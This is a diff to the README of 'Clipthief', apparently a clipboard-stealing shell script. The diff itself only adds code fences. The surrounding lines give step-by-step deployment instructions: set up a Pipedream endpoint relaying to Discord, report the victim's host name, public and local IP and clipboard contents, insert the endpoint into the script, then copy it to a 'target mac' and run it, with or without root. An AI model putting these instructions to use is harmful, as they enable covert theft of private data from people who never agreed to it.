@@ -7,6 +7,7 @@ A rudimentary shell script that waits in the background and steals clipboard dat
 3. Deploy the project
 4. Authenticate your Discord account with Pipedream and allow access to a server.
 5. Paste the following text in the `steps.send_message_advanced`
+```py
 -------------------------------------------------
 Host Name --> {{event.body.localhostname}}
 Local Time --> {{steps.trigger.context.ts}}
@@ -14,6 +15,7 @@ Public IP --> {{steps.trigger.event.client_ip}}
 Local IP --> {{steps.trigger.event.body.localip}}
 Clipboard Data --> {{event.body.clipboard}}
 -------------------------------------------------
+```
 7. Copy the endpoint in the trigger called steps.trigger (https://xxxxxxxxxxxxx.m.pipedream.net)
 8. Replace `REPLACE_ME` in [clipthief.sh](https://github.com/rhijjawi/Clipthief/blob/main/shell/clipthief.sh) with your endpoint
 9. Copy the shell file to your target mac and execute it with `sudo ./clifthief.sh` or `./clipthief.sh` if the user does not have root privileges or the root password is unknown. 
